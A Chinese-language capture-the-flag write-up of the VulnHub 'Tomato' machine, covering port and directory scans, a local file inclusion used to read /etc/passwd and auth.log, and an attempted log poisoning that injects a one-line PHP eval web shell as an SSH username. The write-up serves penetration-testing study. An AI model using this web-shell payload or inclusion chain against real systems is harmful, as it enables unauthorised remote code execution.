# Tomato

### 目标探测

Nmap扫描目标开放端口

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# nmap -sV -sT -sC -oA nmap_initial 192.168.19.147 -oN nmap.txt
Nmap scan report for 192.168.19.147
Host is up (0.0077s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomato
8888/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Private Property
|_http-title: 401 Authorization Required
|_http-server-header: nginx/1.10.3 (Ubuntu)
MAC Address: 00:0C:29:6E:EA:1C (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 11 08:49:39 2023 -- 1 IP address (1 host up) scanned in 9.50 seconds
```

访问一下目标的80端口

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

没什么有用的信息，在看看8888端口

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

好吧，是个登录界面，让我们再回到80端口页面，dirb扫描看下有没有扫描有用的东西

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# dirb http://192.168.19.147/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 12 06:27:27 2023
URL_BASE: http://192.168.19.147/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.19.147/ ----
==> DIRECTORY: http://192.168.19.147/antibot_image/                                                                
+ http://192.168.19.147/index.html (CODE:200|SIZE:652)                                                             
+ http://192.168.19.147/server-status (CODE:403|SIZE:279)                                                          
                                                                                                                   
---- Entering directory: http://192.168.19.147/antibot_image/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Sep 12 06:27:30 2023
DOWNLOADED: 4612 - FOUND: 2
```

让我们访问一下/antibot\_image这个目录，发现了一些有趣的东西

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

发现info.php是一个phpinfo页面，

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

查看网页源码发现有一个注释有一个文件包含，传的参数为image

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

我们尝试一下LFI读取一下它的/etc/passwd

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

看下能否读取到它的服务日志文件，通过nmap扫描的信息可以看出它有两个web服务日志，Apache和Nginx，有关文件包含的内容我们可以查看下面这篇文章。

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion#file-inclusion" %}

我们尝试包含一下/var/log/auth.log这个文件

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

然后我们尝试以一句话木马作为用户名ssh登录

```
┌──(root㉿kali)-[~/Desktop/TargetDrone/Vulnhub/Tomato]
└─# ssh '<?php @eval($_POST['a']) ?>'@192.168.19.147
ssh: connect to host 192.168.19.147 port 22: Connection refused
```

